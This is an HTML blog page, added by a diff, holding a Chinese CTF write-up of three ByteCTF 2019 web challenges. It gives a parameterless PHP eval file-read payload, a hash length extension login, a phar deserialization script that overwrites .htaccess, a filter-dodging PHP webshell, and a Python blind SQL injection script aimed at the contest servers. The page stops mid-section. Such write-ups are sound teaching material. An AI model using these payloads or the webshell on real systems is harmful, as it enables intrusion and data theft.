@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ByteCTF_WEB | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  
+  <meta name="description" content="终于拿到了XCTFfinal的资格 队友都太强了。icloudmusic的wp暂无法公开。其他部分wp见 1https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6324">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ByteCTF_WEB">
+<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2019&#x2F;09&#x2F;09&#x2F;ByteCTF-WEB&#x2F;index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="终于拿到了XCTFfinal的资格 队友都太强了。icloudmusic的wp暂无法公开。其他部分wp见 1https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6324">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2019&#x2F;09&#x2F;09&#x2F;ByteCTF-WEB&#x2F;2019-09-09-09-00-38.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;1567950881bf91daec592fad51c0d47392d8badf9c-1024x611.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;15679510369530743c9c868c268cb00bbb3f78708f-1024x781.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;1567951062f4c24a688770b5d639bf5b9043815698-1024x398.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;1567952182d592f3d6d75c51ce888e4a767ae5942a-880x1024.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;1567952383ac66d865cf8990821584d2faf25ceaea-1024x422.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;156795239939d6c72cae2084fa27a2e0faff84daac-1024x585.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;1567952647726a9614a436bc47ae1fba369b9d8944-1024x835.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;15679528894eb711ac734c1aac15b21ffac79f7857.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;156795709583844d7486bbf94b37df82d7ad51fc78-1024x744.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;09&#x2F;1567957169e694e209bd313e9fd6ee26d41c0af7f0-1024x427.png">
+<meta property="og:updated_time" content="2019-09-12T03:49:16.821Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2019&#x2F;09&#x2F;09&#x2F;ByteCTF-WEB&#x2F;2019-09-09-09-00-38.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-ByteCTF-WEB" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      ByteCTF_WEB
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/09/09/ByteCTF-WEB/" class="article-date">
+	  <time datetime="2019-09-09T00:58:57.000Z" itemprop="datePublished">September 9, 2019</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>终于拿到了XCTFfinal的资格 队友都太强了。<br>icloudmusic的wp暂无法公开。<br>其他部分wp见</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">6324</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h2 id="boringcode"><a href="#boringcode" class="headerlink" title="boringcode"></a>boringcode</h2><p>代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>两个点</p>
+<ul>
+<li>域名需要包含baidu.com</li>
+<li>绕过正则和过滤将字符串传入eval中执行</li>
+</ul>
+<h3 id="第一个点"><a href="#第一个点" class="headerlink" title="第一个点"></a>第一个点</h3><p>队友财大气粗直接买了个域名，成功绕过。  （缓缓打出一个？</p>
+<h3 id="第二个点"><a href="#第二个点" class="headerlink" title="第二个点"></a>第二个点</h3><p>正则只允许我们传入形如 a(b(c())) 的字符串，且最后一个括号内不能有参数。<br>参考一叶飘零的总结 <a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<p>但是这题加大了很多难度，过滤了这么些东西<code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/</code><br>没有et的话所有带get的都不能用了。想getshell几乎不可能了。<br>再加上<!-- flag in this file and code in /code -->的提示。只需要达到文件读取就可以了。</p>
+<p>先构造出一个可以读当前目录的payload<br><code>echo(readfile(end(scandir(&#39;.&#39;))))</code>  可以读取目录中最后一个文件。</p>
+<p>现在需要构造一个能产生.的函数。找到这个函数 localeconv() ，会返回一个数组，数组第一项就是 “.”<br>那么用current(localeconv())取出第一项，发现nt被BAN了，翻手册找到了pos()函数，是current的别名。<br>那么当前的payload<br><code>echo(readfile(end(scandir(current(localeconv())))))</code><br>但是flag目录在上层目录，需要用chdir跳转。可以chdir只会返回bool值。我们需要找一个函数接受布尔值并且可以输出”.”<br>想到了时间有关函数 time()  localtime()，<br>time(true)会返回当前时间戳，但是时间戳的值无法转变为想要的”.”<br>localtime()返回数组，可以提取出秒数的值，用chr转换为字符串”.” 即在46s时 <code>chr(pos(localtime()))</code>就会返回”.”<br>但是localtime()内接受布尔参数会报错，陷入僵局。</p>
+<p>继续翻手册发现了<br>![](./ByteCTF-WEB/屏幕快照 2019-09-08 22.18.06.png)</p>
+<p>localtime第一参数默认是time() ，那我可以用localtime接受time函数，time接受一个bool值。</p>
+<p>构造最终payload<code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></p>
+<p>把(买的)域名指向到自己的服务器，服务器上放一个文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br></pre></td></tr></table></figure>
+<p>然后发包去访问，需要简单爆破下，只有在时间为某分46秒时可以读到源码<br>![](./ByteCTF-WEB/屏幕快照 2019-09-08 22.28.17.png)</p>
+<h2 id="EZCMS"><a href="#EZCMS" class="headerlink" title="EZCMS"></a>EZCMS</h2><p>这个题有点难受 没坐上主办方的车 最后用正规解做的<br><a href="http://www.zip拿到源码" target="_blank" rel="noopener">www.zip拿到源码</a><br>简单审计，明显的hash长度拓展攻击，老套路了。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">password:admin%<span class="number">80</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">90</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>admina</span><br></pre></td></tr></table></figure>
+<p>登陆之后加上cookie fcb0b00520b914c23b9e95db070008ad<br><img src="/2019/09/09/ByteCTF-WEB/2019-09-09-09-00-38.jpg" alt=""></p>
+<p>继续审计发现一个phar反序列化点。<br>view.php中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="keyword">new</span> File($file_name, $file_path);</span><br></pre></td></tr></table></figure>
+<p>跟进后filepath会进入mime_content_type函数。再加上我们可以控制上传文件的内容，达成一条反序列化链。<br>两种攻击思路</p>
+<ul>
+<li>反序列化调用upload_file函数，上传到其他目录获取shell</li>
+<li>重写htaccess内容或者删掉htaccess</li>
+</ul>
+<p>第一条路由于使用的是move_uploaded_file，会对tmp文件名检测，在不知道tmp名的情况下无法使用。</p>
+<p>走第二条路<br>直接上反序列化构造脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> File(<span class="string">"altman"</span>,<span class="string">"altman"</span>);</span><br><span class="line">$a-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;username = <span class="string">"/var/www/html/sandbox/a87136ce5a8b85871f1d0b6b2add38d2/.htaccess"</span>;</span><br><span class="line">$a-&gt;checker-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;</span><br><span class="line">$a-&gt;checker-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($a); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>构造好后先上传一个简单马，需要绕过黑名单</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"syste"</span>;</span><br><span class="line">$b=<span class="string">"m"</span>;</span><br><span class="line">$c=$a.$b;</span><br><span class="line">$d=$c($_REQUEST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后将生成的phar上传，利用filter绕过对phar的过滤 （见suctf）</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">112.126</span>.<span class="number">102.158</span>:<span class="number">9999</span><span class="regexp">/view.php?filename=dd7ec931179c4dcb6a8ffb8b8786d20b.txt&amp;filepath=php:/</span><span class="regexp">/filter/</span>resource=phar:<span class="regexp">//</span>sandbox<span class="regexp">/a87136ce5a8b85871f1d0b6b2add38d2/</span>dd7ec931179c4dcb6a8ffb8b8786d20b.txt</span><br></pre></td></tr></table></figure>
+
+<p>触发反序列化。删掉htaccess。此时切记不要访问upload.php，否则会重新生成htaccess。<br>直接访问沙盒下第一个上传的php文件，拿到shell。<br>![](./ByteCTF-WEB/屏幕快照 2019-09-08 23.32.43.png)</p>
+<h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>扫描发现<a href="http://www.zip拿下源码" target="_blank" rel="noopener">www.zip拿下源码</a><br>审计后发现一个二次注入点，在edit.php中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>-&gt;query(<span class="string">"update article set title='<span class="variable">$title</span>',content='<span class="variable">$content</span>' where title='"</span> . <span class="variable">$row</span>[<span class="string">'title'</span>] . <span class="string">"';"</span>);</span><br></pre></td></tr></table></figure>
+<p>title从数据库中取出来后直接拼接进了语句中。<br>绕过过滤构造语句注入</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'^(ascii(substr((select(group_concat(schema_name)) from (information_schema.schemata)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>)^'<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>ps：其实这里注入数据库没用，需要堆叠注入添加vip账号<br>贴上队友@glzjin的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1'^(ascii(substr((select(group_concat(schema_name)) from (information_schema.schemata)),1,1))&gt;1)^'1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_all_databases(<span class="string">"http://112.126.101.16:9999/"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    result = requests.post(url + <span class="string">"writing.php"</span>, data=&#123;<span class="string">'title'</span>: <span class="string">"1'^("</span> + payload + <span class="string">")^'1"</span>, <span class="string">'content'</span>: <span class="string">'fuhei'</span>&#125;, headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=cs04skbivc1g706vka0f76avt4"</span>&#125;)</span><br><span class="line">    result.encoding = <span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    r2 = requests.get(url + <span class="string">"index.php"</span>, headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=cs04skbivc1g706vka0f76avt4"</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pattern = re.compile(<span class="string">r'edit.php\?id=(\d+)'</span>)</span><br><span class="line">    result1 = pattern.findall(r2.text)</span><br><span class="line">    result = requests.post(url + <span class="string">"edit.php"</span>, data=&#123;<span class="string">'title'</span>: <span class="string">"fuhei"</span>, <span class="string">'content'</span>: <span class="string">'fuhei'</span>, <span class="string">"id"</span>: result1[<span class="number">0</span>]&#125;,</span><br><span class="line">                           headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=cs04skbivc1g706vka0f76avt4"</span>&#125;)</span><br><span class="line">    result.encoding = <span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    result2 = requests.get(url + <span class="string">"edit.php?id="</span> + result1[<span class="number">0</span>], headers=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=cs04skbivc1g706vka0f76avt4"</span>&#125;)</span><br><span class="line">    print(result2.text.find(<span class="string">'ascii'</span>) == <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result2.text.find(<span class="string">'ascii'</span>) == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">(url)</span>:</span></span><br><span class="line">    db_name = <span class="string">""</span></span><br><span class="line">    db_payload = <span class="string">"select(group_concat(schema_name)) from (information_schema.schemata)"</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">        db_name_payload = <span class="string">"ascii(substr(("</span> + db_payload + <span class="string">"),%d,1))"</span> % (</span><br><span class="line">            y)</span><br><span class="line">        db_name += chr(half(url, db_name_payload))</span><br><span class="line">        print(db_name)</span><br><span class="line">    print(<span class="string">"值为：%s"</span> % db_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 二分法函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s &gt; %d"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(url, mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>这里搭了一波车，没有堆叠添加vip账户，而是拿了一个其他队伍的vip用户登陆上去了。</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>有vip后进入replace<br>发现一处可以命令执行的地方</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = addslashes(preg_replace(<span class="string">"/"</span> . $_POST[<span class="string">'find'</span>] . <span class="string">"/"</span>, $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>服务器版本php5.3，可以用/e修饰符来rce。<br>写成脚本交互</p>
